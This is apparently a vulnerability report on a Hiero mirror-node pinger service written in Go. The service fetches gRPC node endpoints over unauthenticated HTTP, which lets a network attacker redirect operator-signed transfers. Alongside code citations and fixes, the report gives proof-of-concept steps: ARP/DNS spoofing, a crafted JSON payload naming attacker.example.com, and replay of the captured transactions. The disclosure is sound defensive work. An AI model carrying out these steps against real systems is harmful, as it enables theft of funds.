### Title
Unauthenticated HTTP Node-Discovery Allows MITM Injection of Attacker-Controlled gRPC Endpoints

### Summary
When `network=other` is configured, `buildNetworkFromMirrorNodes()` constructs a plain `http.Client` with no TLS enforcement, no certificate pinning, and no response-integrity verification, then issues an unauthenticated HTTP GET to the operator-supplied mirror REST URL. A network-positioned attacker who can intercept that plaintext HTTP response can inject a crafted `nodesEnvelope` whose `ServiceEndpoints` point to attacker-controlled gRPC hosts. The resulting `network` map is passed directly to `hiero.ClientForNetwork()`, causing every subsequent operator-signed `TransferTransaction` to be submitted to the attacker's infrastructure instead of the real Hashgraph network.

### Finding Description

**Code path:**

`pinger/config.go` line 37 accepts `http://mirror-rest:5551` as the documented example value for `HIERO_MIRROR_PINGER_REST`. [1](#0-0) 

`buildNetworkFromMirrorNodes()` constructs the HTTP client with no TLS transport override: [2](#0-1) 

`fetchMirrorNodeNetwork()` issues the GET and decodes the response body with zero integrity checks: [3](#0-2) 

The `DomainName` / `IPAddressV4` fields from the attacker-controlled response are used verbatim to build the gRPC address map: [4](#0-3) 

That map is handed directly to `hiero.ClientForNetwork()` and the operator key is set on the resulting client: [5](#0-4) 

Every `TransferTransaction.Execute(client)` call then targets the attacker's endpoints: [6](#0-5) 

**Root cause:** The code assumes the mirror REST endpoint is trusted and its response is authentic. There is no schema enforcement (HTTPS-only), no TLS certificate pinning, no HMAC/signature on the JSON payload, and no cross-validation of returned node addresses against a known-good set.

**Why existing checks fail:**
- HTTP status-code check (lines 90–93) only rejects non-2xx responses — an attacker returns 200. [7](#0-6) 
- JSON decode check (line 96) only rejects malformed JSON — attacker returns valid JSON. [8](#0-7) 
- `NodeAccountID` and host/port guards (lines 103–119) only reject empty fields — attacker supplies plausible values. [9](#0-8) 

### Impact Explanation
The attacker receives every operator-signed `CryptoTransfer` transaction. Because the transactions are signed with the operator's private key and carry valid transaction IDs, the attacker can forward them to the real Hashgraph network at will, causing unintended fund transfers. The pinger's monitoring function is simultaneously blinded (it never gets real receipts), defeating its liveness purpose. The operator key itself is not directly exposed, but the signed transaction bytes are, enabling replay to the real network.

### Likelihood Explanation
The attack requires network-level interception of the HTTP channel between the pinger pod and the mirror REST service. In Kubernetes or cloud environments this is achievable via: ARP/NDP poisoning on a shared subnet, DNS record poisoning (if the mirror hostname resolves via an attacker-influenced resolver), or a compromised sidecar/proxy. The `http://` example URL in the documented default makes plaintext deployment the expected path for `network=other` deployments. No credentials or privileged access to the pinger host are required — only a network-adjacent position.

### Recommendation
1. **Enforce HTTPS at startup:** Reject any `mirrorRest` URL whose scheme is not `https` in `loadConfig()`.
2. **Pin or validate the TLS certificate:** Supply a custom `tls.Config` with a pinned CA or leaf certificate fingerprint in the `http.Client` transport.
3. **Cross-validate returned endpoints:** After fetching node addresses, verify at least one returned address matches a known-good set (e.g., hard-coded well-known node IPs/domains for the target network).
4. **Optionally sign the response:** If the mirror node is operator-controlled, add an HMAC or signed envelope to the `/network/nodes` response and verify it before trusting any endpoint data.

### Proof of Concept
1. Deploy the pinger with `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551`.
2. On the same network segment, run a rogue HTTP server at the IP that `mirror-rest` resolves to (via ARP spoofing or DNS poisoning).
3. Configure the rogue server to respond to `GET /api/v1/network/nodes` with:
   ```json
   {"nodes":[{"node_account_id":"0.0.3","service_endpoints":[{"domain_name":"attacker.example.com","ip_address_v4":"","port":50211}]}],"links":{"next":null}}
   ```
4. Start the pinger. `buildNetworkFromMirrorNodes()` fetches the rogue response; `fetchMirrorNodeNetwork()` decodes it without error; `hiero.ClientForNetwork()` is called with `{"attacker.example.com:50211": AccountID{0,0,3}}`.
5. On `attacker.example.com:50211`, run a gRPC listener that logs incoming `CryptoTransfer` protobuf messages. Every tick the pinger sends a fully operator-signed transaction to this endpoint. Forward those bytes to a real Hashgraph node to execute the transfer on the live network.

### Citations

**File:** pinger/config.go (L37-37)
```go
	flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST", ""), "mirror node REST base URL (required for other), e.g. http://mirror-rest:5551")
```

**File:** pinger/mirror_node_client.go (L46-46)
```go
	httpClient := &http.Client{Timeout: cfg.mirrorNodeClientTimeout}
```

**File:** pinger/mirror_node_client.go (L79-98)
```go
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, false, err
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, true, fmt.Errorf("GET %s failed: %w", url, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		retry := resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode >= 500
		return nil, retry, fmt.Errorf("GET %s returned %s", url, resp.Status)
	}

	var payload nodesEnvelope
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
	}
```

**File:** pinger/mirror_node_client.go (L103-124)
```go
		if n.NodeAccountID == "" {
			continue
		}

		nodeAccountId, err := hiero.AccountIDFromString(n.NodeAccountID)
		if err != nil {
			continue
		}

		// Use service_endpoints for node gRPC (what the SDK wants)
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
		}
```

**File:** pinger/sdk_client.go (L18-45)
```go
		netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
		if err != nil {
			return nil, err
		}
		client = hiero.ClientForNetwork(netmap)

	case "testnet", "previewnet", "mainnet":
		c, err := hiero.ClientForName(cfg.network)
		if err != nil {
			return nil, err
		}
		client = c

	default:
		return nil, fmt.Errorf("unknown network %q (testnet|previewnet|mainnet|other)", cfg.network)
	}

	opID, err := hiero.AccountIDFromString(cfg.operatorID)
	if err != nil {
		return nil, fmt.Errorf("invalid operator id: %w", err)
	}

	opKey, err := hiero.PrivateKeyFromString(cfg.operatorKey)
	if err != nil {
		return nil, fmt.Errorf("invalid operator key: %w", err)
	}

	client.SetOperator(opID, opKey)
```

**File:** pinger/transfer.go (L29-33)
```go
		cryptoTransfer := hiero.NewTransferTransaction().
			AddHbarTransfer(client.GetOperatorAccountID(), hiero.HbarFromTinybar(-cfg.amountTinybar)).
			AddHbarTransfer(toID, hiero.HbarFromTinybar(cfg.amountTinybar))

		resp, err := cryptoTransfer.Execute(client)
```
